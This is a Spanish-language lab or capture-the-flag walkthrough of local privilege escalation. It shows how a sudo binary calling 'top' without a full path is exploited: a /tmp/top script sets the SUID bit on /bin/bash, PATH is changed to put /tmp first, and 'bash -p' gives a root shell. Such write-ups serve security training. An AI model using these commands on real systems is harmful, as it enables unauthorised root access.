Listamos los binarios que podemos ejecutar como SUDO
![[Pasted image 20250629210415.png]]
Al ejecutarlo vemos que se listan los procesos de la máquina, por lo tanto se esta ejecutando un "top"
![[Pasted image 20250629210511.png]]
```
strings /home/anansi/bin/anansi_util
```
Al ejecutar ese comando, vemos lo siguiente:
```
begin: saved other filter data -------------------
9*3$"
%-*.*s%s
%*.*s%s
kmgtpe
%-*.*s%s
%*.*s%
top <---------------- el comando llamado sin su ruta absoluta
 ~6 ~1
?BdEefgHhIkrsXYZ0
!12345Clmt
#<>bcFiJjnOoRSUuVvxyz
+-=_&AaGLw

```
Al saber eso, creamos un script con el nombre de top, que le de permisos SUID a la bash. Lo alojamos en el directorio /tmp y le damos permisos de ejecución.
```
echo "chmod u+s /bin/bash" > /tmp/top
chmod +x /tmp/top
```
Imprimimos el contenido de la variable de entorno PATH (**es una lista de directorios separados por dos puntos que le dice a tu shell dónde buscar primero el programa o script ejecutable que especificaste**)
```
echo $PATH
```

![[Pasted image 20250629211212.png]]
Modificamos el PATH para que comience con el directorio /tmp
```
export PATH=/tmp:$PATH
echo $PATH
```

![[Pasted image 20250629211306.png]]
Ejecutamos el comando nuevamente
![[Pasted image 20250629211409.png]]

![[Pasted image 20250629211423.png]]
Ahora comprobamos si la bash a adquirido los privilegios SUID:
```
ls -la /bin/bash
```
Resultado:
```
-rwsrwxr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```
Ahora lanzamos una bash con privilegios:
```
/bin/bash -p
```
![[Pasted image 20250629214413.png]]



